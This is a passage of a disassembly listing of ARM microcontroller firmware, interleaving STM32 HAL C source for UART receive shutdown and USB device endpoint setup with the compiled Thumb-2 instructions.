 8005ce8:	643b      	str	r3, [r7, #64]	; 0x40
 8005cea:	63fa      	str	r2, [r7, #60]	; 0x3c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005cec:	6bf9      	ldr	r1, [r7, #60]	; 0x3c
 8005cee:	6c3a      	ldr	r2, [r7, #64]	; 0x40
 8005cf0:	e841 2300 	strex	r3, r2, [r1]
 8005cf4:	63bb      	str	r3, [r7, #56]	; 0x38
   return(result);
 8005cf6:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005cf8:	2b00      	cmp	r3, #0
 8005cfa:	d1e6      	bne.n	8005cca <UART_EndRxTransfer+0x8>
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005cfc:	687b      	ldr	r3, [r7, #4]
 8005cfe:	681b      	ldr	r3, [r3, #0]
 8005d00:	3308      	adds	r3, #8
 8005d02:	623b      	str	r3, [r7, #32]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005d04:	6a3b      	ldr	r3, [r7, #32]
 8005d06:	e853 3f00 	ldrex	r3, [r3]
 8005d0a:	61fb      	str	r3, [r7, #28]
   return(result);
 8005d0c:	69fb      	ldr	r3, [r7, #28]
 8005d0e:	f023 0301 	bic.w	r3, r3, #1
 8005d12:	64bb      	str	r3, [r7, #72]	; 0x48
 8005d14:	687b      	ldr	r3, [r7, #4]
 8005d16:	681b      	ldr	r3, [r3, #0]
 8005d18:	3308      	adds	r3, #8
 8005d1a:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005d1c:	62fa      	str	r2, [r7, #44]	; 0x2c
 8005d1e:	62bb      	str	r3, [r7, #40]	; 0x28
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005d20:	6ab9      	ldr	r1, [r7, #40]	; 0x28
 8005d22:	6afa      	ldr	r2, [r7, #44]	; 0x2c
 8005d24:	e841 2300 	strex	r3, r2, [r1]
 8005d28:	627b      	str	r3, [r7, #36]	; 0x24
   return(result);
 8005d2a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005d2c:	2b00      	cmp	r3, #0
 8005d2e:	d1e5      	bne.n	8005cfc <UART_EndRxTransfer+0x3a>
#endif /* USART_CR1_FIFOEN */

  /* In case of reception waiting for IDLE event, disable also the IDLE IE interrupt source */
  if (huart->ReceptionType == HAL_UART_RECEPTION_TOIDLE)
 8005d30:	687b      	ldr	r3, [r7, #4]
 8005d32:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8005d34:	2b01      	cmp	r3, #1
 8005d36:	d118      	bne.n	8005d6a <UART_EndRxTransfer+0xa8>
  {
    ATOMIC_CLEAR_BIT(huart->Instance->CR1, USART_CR1_IDLEIE);
 8005d38:	687b      	ldr	r3, [r7, #4]
 8005d3a:	681b      	ldr	r3, [r3, #0]
 8005d3c:	60fb      	str	r3, [r7, #12]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005d3e:	68fb      	ldr	r3, [r7, #12]
 8005d40:	e853 3f00 	ldrex	r3, [r3]
 8005d44:	60bb      	str	r3, [r7, #8]
   return(result);
 8005d46:	68bb      	ldr	r3, [r7, #8]
 8005d48:	f023 0310 	bic.w	r3, r3, #16
 8005d4c:	647b      	str	r3, [r7, #68]	; 0x44
 8005d4e:	687b      	ldr	r3, [r7, #4]
 8005d50:	681b      	ldr	r3, [r3, #0]
 8005d52:	461a      	mov	r2, r3
 8005d54:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8005d56:	61bb      	str	r3, [r7, #24]
 8005d58:	617a      	str	r2, [r7, #20]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005d5a:	6979      	ldr	r1, [r7, #20]
 8005d5c:	69ba      	ldr	r2, [r7, #24]
 8005d5e:	e841 2300 	strex	r3, r2, [r1]
 8005d62:	613b      	str	r3, [r7, #16]
   return(result);
 8005d64:	693b      	ldr	r3, [r7, #16]
 8005d66:	2b00      	cmp	r3, #0
 8005d68:	d1e6      	bne.n	8005d38 <UART_EndRxTransfer+0x76>
  }

  /* At end of Rx process, restore huart->RxState to Ready */
  huart->RxState = HAL_UART_STATE_READY;
 8005d6a:	687b      	ldr	r3, [r7, #4]
 8005d6c:	2220      	movs	r2, #32
 8005d6e:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005d72:	687b      	ldr	r3, [r7, #4]
 8005d74:	2200      	movs	r2, #0
 8005d76:	661a      	str	r2, [r3, #96]	; 0x60

  /* Reset RxIsr function pointer */
  huart->RxISR = NULL;
 8005d78:	687b      	ldr	r3, [r7, #4]
 8005d7a:	2200      	movs	r2, #0
 8005d7c:	669a      	str	r2, [r3, #104]	; 0x68
}
 8005d7e:	bf00      	nop
 8005d80:	3754      	adds	r7, #84	; 0x54
 8005d82:	46bd      	mov	sp, r7
 8005d84:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005d88:	4770      	bx	lr

08005d8a <USB_CoreInit>:
  * @param  cfg pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_CoreInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 8005d8a:	b084      	sub	sp, #16
 8005d8c:	b480      	push	{r7}
 8005d8e:	b083      	sub	sp, #12
 8005d90:	af00      	add	r7, sp, #0
 8005d92:	6078      	str	r0, [r7, #4]
 8005d94:	f107 0014 	add.w	r0, r7, #20
 8005d98:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005d9c:	2300      	movs	r3, #0
}
 8005d9e:	4618      	mov	r0, r3
 8005da0:	370c      	adds	r7, #12
 8005da2:	46bd      	mov	sp, r7
 8005da4:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005da8:	b004      	add	sp, #16
 8005daa:	4770      	bx	lr

08005dac <USB_EnableGlobalInt>:
  *         Enables the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EnableGlobalInt(USB_TypeDef *USBx)
{
 8005dac:	b480      	push	{r7}
 8005dae:	b085      	sub	sp, #20
 8005db0:	af00      	add	r7, sp, #0
 8005db2:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8005db4:	687b      	ldr	r3, [r7, #4]
 8005db6:	2200      	movs	r2, #0
 8005db8:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8005dbc:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8005dc0:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Set interrupt mask */
  USBx->CNTR = (uint16_t)winterruptmask;
 8005dc2:	68fb      	ldr	r3, [r7, #12]
 8005dc4:	b29a      	uxth	r2, r3
 8005dc6:	687b      	ldr	r3, [r7, #4]
 8005dc8:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8005dcc:	2300      	movs	r3, #0
}
 8005dce:	4618      	mov	r0, r3
 8005dd0:	3714      	adds	r7, #20
 8005dd2:	46bd      	mov	sp, r7
 8005dd4:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005dd8:	4770      	bx	lr

08005dda <USB_DisableGlobalInt>:
  *         Disable the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DisableGlobalInt(USB_TypeDef *USBx)
{
 8005dda:	b480      	push	{r7}
 8005ddc:	b085      	sub	sp, #20
 8005dde:	af00      	add	r7, sp, #0
 8005de0:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8005de2:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8005de6:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Clear interrupt mask */
  USBx->CNTR &= (uint16_t)(~winterruptmask);
 8005de8:	687b      	ldr	r3, [r7, #4]
 8005dea:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8005dee:	b29a      	uxth	r2, r3
 8005df0:	68fb      	ldr	r3, [r7, #12]
 8005df2:	b29b      	uxth	r3, r3
 8005df4:	43db      	mvns	r3, r3
 8005df6:	b29b      	uxth	r3, r3
 8005df8:	4013      	ands	r3, r2
 8005dfa:	b29a      	uxth	r2, r3
 8005dfc:	687b      	ldr	r3, [r7, #4]
 8005dfe:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8005e02:	2300      	movs	r3, #0
}
 8005e04:	4618      	mov	r0, r3
 8005e06:	3714      	adds	r7, #20
 8005e08:	46bd      	mov	sp, r7
 8005e0a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e0e:	4770      	bx	lr

08005e10 <USB_SetCurrentMode>:
  *          This parameter can be one of the these values:
  *            @arg USB_DEVICE_MODE Peripheral mode
  * @retval HAL status
  */
HAL_StatusTypeDef USB_SetCurrentMode(USB_TypeDef *USBx, USB_ModeTypeDef mode)
{
 8005e10:	b480      	push	{r7}
 8005e12:	b083      	sub	sp, #12
 8005e14:	af00      	add	r7, sp, #0
 8005e16:	6078      	str	r0, [r7, #4]
 8005e18:	460b      	mov	r3, r1
 8005e1a:	70fb      	strb	r3, [r7, #3]

  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 8005e1c:	2300      	movs	r3, #0
}
 8005e1e:	4618      	mov	r0, r3
 8005e20:	370c      	adds	r7, #12
 8005e22:	46bd      	mov	sp, r7
 8005e24:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e28:	4770      	bx	lr

08005e2a <USB_DevInit>:
  * @param  cfg  pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DevInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 8005e2a:	b084      	sub	sp, #16
 8005e2c:	b480      	push	{r7}
 8005e2e:	b083      	sub	sp, #12
 8005e30:	af00      	add	r7, sp, #0
 8005e32:	6078      	str	r0, [r7, #4]
 8005e34:	f107 0014 	add.w	r0, r7, #20
 8005e38:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* Prevent unused argument(s) compilation warning */
  UNUSED(cfg);

  /* Init Device */
  /* CNTR_FRES = 1 */
  USBx->CNTR = (uint16_t)USB_CNTR_FRES;
 8005e3c:	687b      	ldr	r3, [r7, #4]
 8005e3e:	2201      	movs	r2, #1
 8005e40:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* CNTR_FRES = 0 */
  USBx->CNTR = 0U;
 8005e44:	687b      	ldr	r3, [r7, #4]
 8005e46:	2200      	movs	r2, #0
 8005e48:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8005e4c:	687b      	ldr	r3, [r7, #4]
 8005e4e:	2200      	movs	r2, #0
 8005e50:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /*Set Btable Address*/
  USBx->BTABLE = BTABLE_ADDRESS;
 8005e54:	687b      	ldr	r3, [r7, #4]
 8005e56:	2200      	movs	r2, #0
 8005e58:	f8a3 2050 	strh.w	r2, [r3, #80]	; 0x50

  return HAL_OK;
 8005e5c:	2300      	movs	r3, #0
}
 8005e5e:	4618      	mov	r0, r3
 8005e60:	370c      	adds	r7, #12
 8005e62:	46bd      	mov	sp, r7
 8005e64:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e68:	b004      	add	sp, #16
 8005e6a:	4770      	bx	lr

08005e6c <USB_FlushTxFifo>:
  *         This parameter can be a value from 1 to 15
            15 means Flush all Tx FIFOs
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushTxFifo(USB_TypeDef const *USBx, uint32_t num)
{
 8005e6c:	b480      	push	{r7}
 8005e6e:	b083      	sub	sp, #12
 8005e70:	af00      	add	r7, sp, #0
 8005e72:	6078      	str	r0, [r7, #4]
 8005e74:	6039      	str	r1, [r7, #0]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005e76:	2300      	movs	r3, #0
}
 8005e78:	4618      	mov	r0, r3
 8005e7a:	370c      	adds	r7, #12
 8005e7c:	46bd      	mov	sp, r7
 8005e7e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e82:	4770      	bx	lr

08005e84 <USB_FlushRxFifo>:
  * @brief  USB_FlushRxFifo : Flush Rx FIFO
  * @param  USBx : Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushRxFifo(USB_TypeDef const *USBx)
{
 8005e84:	b480      	push	{r7}
 8005e86:	b083      	sub	sp, #12
 8005e88:	af00      	add	r7, sp, #0
 8005e8a:	6078      	str	r0, [r7, #4]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005e8c:	2300      	movs	r3, #0
}
 8005e8e:	4618      	mov	r0, r3
 8005e90:	370c      	adds	r7, #12
 8005e92:	46bd      	mov	sp, r7
 8005e94:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e98:	4770      	bx	lr
	...

08005e9c <USB_ActivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_ActivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8005e9c:	b480      	push	{r7}
 8005e9e:	b09d      	sub	sp, #116	; 0x74
 8005ea0:	af00      	add	r7, sp, #0
 8005ea2:	6078      	str	r0, [r7, #4]
 8005ea4:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef ret = HAL_OK;
 8005ea6:	2300      	movs	r3, #0
 8005ea8:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
  uint16_t wEpRegVal;

  wEpRegVal = PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_T_MASK;
 8005eac:	687a      	ldr	r2, [r7, #4]
 8005eae:	683b      	ldr	r3, [r7, #0]
 8005eb0:	781b      	ldrb	r3, [r3, #0]
 8005eb2:	009b      	lsls	r3, r3, #2
 8005eb4:	4413      	add	r3, r2
 8005eb6:	881b      	ldrh	r3, [r3, #0]
 8005eb8:	b29b      	uxth	r3, r3
 8005eba:	f423 43ec 	bic.w	r3, r3, #30208	; 0x7600
 8005ebe:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005ec2:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c

  /* initialize Endpoint */
  switch (ep->type)
 8005ec6:	683b      	ldr	r3, [r7, #0]
 8005ec8:	78db      	ldrb	r3, [r3, #3]
 8005eca:	2b03      	cmp	r3, #3
 8005ecc:	d81f      	bhi.n	8005f0e <USB_ActivateEndpoint+0x72>
 8005ece:	a201      	add	r2, pc, #4	; (adr r2, 8005ed4 <USB_ActivateEndpoint+0x38>)
 8005ed0:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005ed4:	08005ee5 	.word	0x08005ee5
 8005ed8:	08005f01 	.word	0x08005f01
 8005edc:	08005f17 	.word	0x08005f17
 8005ee0:	08005ef3 	.word	0x08005ef3
  {
    case EP_TYPE_CTRL:
      wEpRegVal |= USB_EP_CONTROL;
 8005ee4:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005ee8:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 8005eec:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005ef0:	e012      	b.n	8005f18 <USB_ActivateEndpoint+0x7c>
    case EP_TYPE_BULK:
      wEpRegVal |= USB_EP_BULK;
      break;

    case EP_TYPE_INTR:
      wEpRegVal |= USB_EP_INTERRUPT;
 8005ef2:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005ef6:	f443 63c0 	orr.w	r3, r3, #1536	; 0x600
 8005efa:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005efe:	e00b      	b.n	8005f18 <USB_ActivateEndpoint+0x7c>

    case EP_TYPE_ISOC:
      wEpRegVal |= USB_EP_ISOCHRONOUS;
 8005f00:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f04:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8005f08:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005f0c:	e004      	b.n	8005f18 <USB_ActivateEndpoint+0x7c>

    default:
      ret = HAL_ERROR;
 8005f0e:	2301      	movs	r3, #1
 8005f10:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
      break;
 8005f14:	e000      	b.n	8005f18 <USB_ActivateEndpoint+0x7c>
      break;
 8005f16:	bf00      	nop
  }

  PCD_SET_ENDPOINT(USBx, ep->num, (wEpRegVal | USB_EP_CTR_RX | USB_EP_CTR_TX));
 8005f18:	687a      	ldr	r2, [r7, #4]
 8005f1a:	683b      	ldr	r3, [r7, #0]
 8005f1c:	781b      	ldrb	r3, [r3, #0]
 8005f1e:	009b      	lsls	r3, r3, #2
 8005f20:	441a      	add	r2, r3
 8005f22:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f26:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8005f2a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8005f2e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8005f32:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8005f36:	b29b      	uxth	r3, r3
 8005f38:	8013      	strh	r3, [r2, #0]

  PCD_SET_EP_ADDRESS(USBx, ep->num, ep->num);
 8005f3a:	687a      	ldr	r2, [r7, #4]
 8005f3c:	683b      	ldr	r3, [r7, #0]
 8005f3e:	781b      	ldrb	r3, [r3, #0]
 8005f40:	009b      	lsls	r3, r3, #2
 8005f42:	4413      	add	r3, r2
 8005f44:	881b      	ldrh	r3, [r3, #0]
 8005f46:	b29b      	uxth	r3, r3
 8005f48:	b21b      	sxth	r3, r3
 8005f4a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8005f4e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005f52:	b21a      	sxth	r2, r3
 8005f54:	683b      	ldr	r3, [r7, #0]
 8005f56:	781b      	ldrb	r3, [r3, #0]
 8005f58:	b21b      	sxth	r3, r3
 8005f5a:	4313      	orrs	r3, r2
 8005f5c:	b21b      	sxth	r3, r3
 8005f5e:	f8a7 3066 	strh.w	r3, [r7, #102]	; 0x66
 8005f62:	687a      	ldr	r2, [r7, #4]
 8005f64:	683b      	ldr	r3, [r7, #0]
 8005f66:	781b      	ldrb	r3, [r3, #0]
 8005f68:	009b      	lsls	r3, r3, #2
 8005f6a:	441a      	add	r2, r3
 8005f6c:	f8b7 3066 	ldrh.w	r3, [r7, #102]	; 0x66
 8005f70:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8005f74:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8005f78:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8005f7c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8005f80:	b29b      	uxth	r3, r3
 8005f82:	8013      	strh	r3, [r2, #0]

  if (ep->doublebuffer == 0U)
 8005f84:	683b      	ldr	r3, [r7, #0]
 8005f86:	7b1b      	ldrb	r3, [r3, #12]
 8005f88:	2b00      	cmp	r3, #0
 8005f8a:	f040 8178 	bne.w	800627e <USB_ActivateEndpoint+0x3e2>
  {
    if (ep->is_in != 0U)
 8005f8e:	683b      	ldr	r3, [r7, #0]
 8005f90:	785b      	ldrb	r3, [r3, #1]
 8005f92:	2b00      	cmp	r3, #0
 8005f94:	f000 8084 	beq.w	80060a0 <USB_ActivateEndpoint+0x204>
    {
      /*Set the endpoint Transmit buffer address */
      PCD_SET_EP_TX_ADDRESS(USBx, ep->num, ep->pmaadress);
 8005f98:	687b      	ldr	r3, [r7, #4]
 8005f9a:	61bb      	str	r3, [r7, #24]
 8005f9c:	687b      	ldr	r3, [r7, #4]
 8005f9e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8005fa2:	b29b      	uxth	r3, r3
 8005fa4:	461a      	mov	r2, r3
 8005fa6:	69bb      	ldr	r3, [r7, #24]
 8005fa8:	4413      	add	r3, r2
 8005faa:	61bb      	str	r3, [r7, #24]
 8005fac:	683b      	ldr	r3, [r7, #0]
 8005fae:	781b      	ldrb	r3, [r3, #0]
 8005fb0:	00da      	lsls	r2, r3, #3
 8005fb2:	69bb      	ldr	r3, [r7, #24]
 8005fb4:	4413      	add	r3, r2
 8005fb6:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8005fba:	617b      	str	r3, [r7, #20]
 8005fbc:	683b      	ldr	r3, [r7, #0]
 8005fbe:	88db      	ldrh	r3, [r3, #6]
 8005fc0:	085b      	lsrs	r3, r3, #1
 8005fc2:	b29b      	uxth	r3, r3
 8005fc4:	005b      	lsls	r3, r3, #1
 8005fc6:	b29a      	uxth	r2, r3
 8005fc8:	697b      	ldr	r3, [r7, #20]
 8005fca:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8005fcc:	687a      	ldr	r2, [r7, #4]
 8005fce:	683b      	ldr	r3, [r7, #0]
 8005fd0:	781b      	ldrb	r3, [r3, #0]
 8005fd2:	009b      	lsls	r3, r3, #2
 8005fd4:	4413      	add	r3, r2
 8005fd6:	881b      	ldrh	r3, [r3, #0]
 8005fd8:	827b      	strh	r3, [r7, #18]
 8005fda:	8a7b      	ldrh	r3, [r7, #18]
 8005fdc:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8005fe0:	2b00      	cmp	r3, #0
 8005fe2:	d01b      	beq.n	800601c <USB_ActivateEndpoint+0x180>
 8005fe4:	687a      	ldr	r2, [r7, #4]
 8005fe6:	683b      	ldr	r3, [r7, #0]
 8005fe8:	781b      	ldrb	r3, [r3, #0]
 8005fea:	009b      	lsls	r3, r3, #2
 8005fec:	4413      	add	r3, r2
 8005fee:	881b      	ldrh	r3, [r3, #0]
 8005ff0:	b29b      	uxth	r3, r3
 8005ff2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8005ff6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005ffa:	823b      	strh	r3, [r7, #16]
 8005ffc:	687a      	ldr	r2, [r7, #4]
 8005ffe:	683b      	ldr	r3, [r7, #0]
 8006000:	781b      	ldrb	r3, [r3, #0]
 8006002:	009b      	lsls	r3, r3, #2
 8006004:	441a      	add	r2, r3
 8006006:	8a3b      	ldrh	r3, [r7, #16]
 8006008:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800600c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006010:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006014:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006018:	b29b      	uxth	r3, r3
 800601a:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 800601c:	683b      	ldr	r3, [r7, #0]
 800601e:	78db      	ldrb	r3, [r3, #3]
 8006020:	2b01      	cmp	r3, #1
 8006022:	d020      	beq.n	8006066 <USB_ActivateEndpoint+0x1ca>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 8006024:	687a      	ldr	r2, [r7, #4]
 8006026:	683b      	ldr	r3, [r7, #0]
 8006028:	781b      	ldrb	r3, [r3, #0]
 800602a:	009b      	lsls	r3, r3, #2
 800602c:	4413      	add	r3, r2
 800602e:	881b      	ldrh	r3, [r3, #0]
 8006030:	b29b      	uxth	r3, r3
 8006032:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006036:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800603a:	81bb      	strh	r3, [r7, #12]
 800603c:	89bb      	ldrh	r3, [r7, #12]
 800603e:	f083 0320 	eor.w	r3, r3, #32
 8006042:	81bb      	strh	r3, [r7, #12]
 8006044:	687a      	ldr	r2, [r7, #4]
 8006046:	683b      	ldr	r3, [r7, #0]
 8006048:	781b      	ldrb	r3, [r3, #0]
 800604a:	009b      	lsls	r3, r3, #2
 800604c:	441a      	add	r2, r3
 800604e:	89bb      	ldrh	r3, [r7, #12]
 8006050:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006054:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006058:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800605c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006060:	b29b      	uxth	r3, r3
 8006062:	8013      	strh	r3, [r2, #0]
 8006064:	e2d5      	b.n	8006612 <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006066:	687a      	ldr	r2, [r7, #4]
 8006068:	683b      	ldr	r3, [r7, #0]
 800606a:	781b      	ldrb	r3, [r3, #0]
 800606c:	009b      	lsls	r3, r3, #2
 800606e:	4413      	add	r3, r2
 8006070:	881b      	ldrh	r3, [r3, #0]
 8006072:	b29b      	uxth	r3, r3
 8006074:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006078:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800607c:	81fb      	strh	r3, [r7, #14]
 800607e:	687a      	ldr	r2, [r7, #4]
 8006080:	683b      	ldr	r3, [r7, #0]
 8006082:	781b      	ldrb	r3, [r3, #0]
 8006084:	009b      	lsls	r3, r3, #2
 8006086:	441a      	add	r2, r3
 8006088:	89fb      	ldrh	r3, [r7, #14]
 800608a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800608e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006092:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006096:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800609a:	b29b      	uxth	r3, r3
 800609c:	8013      	strh	r3, [r2, #0]
 800609e:	e2b8      	b.n	8006612 <USB_ActivateEndpoint+0x776>
      }
    }
    else
    {
      /* Set the endpoint Receive buffer address */
      PCD_SET_EP_RX_ADDRESS(USBx, ep->num, ep->pmaadress);
 80060a0:	687b      	ldr	r3, [r7, #4]
 80060a2:	633b      	str	r3, [r7, #48]	; 0x30
 80060a4:	687b      	ldr	r3, [r7, #4]
 80060a6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80060aa:	b29b      	uxth	r3, r3
 80060ac:	461a      	mov	r2, r3
 80060ae:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80060b0:	4413      	add	r3, r2
 80060b2:	633b      	str	r3, [r7, #48]	; 0x30
 80060b4:	683b      	ldr	r3, [r7, #0]
 80060b6:	781b      	ldrb	r3, [r3, #0]
 80060b8:	00da      	lsls	r2, r3, #3
 80060ba:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80060bc:	4413      	add	r3, r2
 80060be:	f203 4304 	addw	r3, r3, #1028	; 0x404
 80060c2:	62fb      	str	r3, [r7, #44]	; 0x2c
 80060c4:	683b      	ldr	r3, [r7, #0]
 80060c6:	88db      	ldrh	r3, [r3, #6]
 80060c8:	085b      	lsrs	r3, r3, #1
 80060ca:	b29b      	uxth	r3, r3
 80060cc:	005b      	lsls	r3, r3, #1
 80060ce:	b29a      	uxth	r2, r3
 80060d0:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 80060d2:	801a      	strh	r2, [r3, #0]

      /* Set the endpoint Receive buffer counter */
      PCD_SET_EP_RX_CNT(USBx, ep->num, ep->maxpacket);
 80060d4:	687b      	ldr	r3, [r7, #4]
 80060d6:	62bb      	str	r3, [r7, #40]	; 0x28
 80060d8:	687b      	ldr	r3, [r7, #4]
 80060da:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80060de:	b29b      	uxth	r3, r3
 80060e0:	461a      	mov	r2, r3
 80060e2:	6abb      	ldr	r3, [r7, #40]	; 0x28
 80060e4:	4413      	add	r3, r2
 80060e6:	62bb      	str	r3, [r7, #40]	; 0x28
 80060e8:	683b      	ldr	r3, [r7, #0]
 80060ea:	781b      	ldrb	r3, [r3, #0]
 80060ec:	00da      	lsls	r2, r3, #3
 80060ee:	6abb      	ldr	r3, [r7, #40]	; 0x28
 80060f0:	4413      	add	r3, r2
 80060f2:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80060f6:	627b      	str	r3, [r7, #36]	; 0x24
 80060f8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
